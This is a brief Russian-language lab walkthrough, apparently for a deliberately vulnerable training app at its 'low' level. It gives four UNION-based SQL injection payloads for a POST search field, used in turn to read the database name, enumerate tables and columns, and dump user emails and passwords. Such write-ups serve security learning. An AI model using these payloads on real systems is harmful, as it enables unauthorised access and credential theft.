---
title: SQL_Injection_POSTSearch
sidebar_position: 1
---

# SQL Injection (POST/Search)

**(low)**


Используем строку
```bash
asd' UNION SELECT NULL,database(),NULL,NULL,NULL,NULL,NULL-- -
```
чтобы вывести название базы

теперь используем строку
```bash
asd' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL from information_schema.tables where table_schema=database()-- -
```
чтобы узнать, какие в базе есть таблицы

на интересует users, поэтому используем следующую строку
```bash
asd' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL from information_schema.columns where table_name='users'-- -
```
чтобы получить список пользователей

сдампим пароли и почты этим payload
```bash
asd' UNION SELECT NULL,email,password,NULL,NULL,NULL,NULL from users-- -
```
![Dumping email and password hashes](images/SQL_Injection_POSTSearch_img_1.png)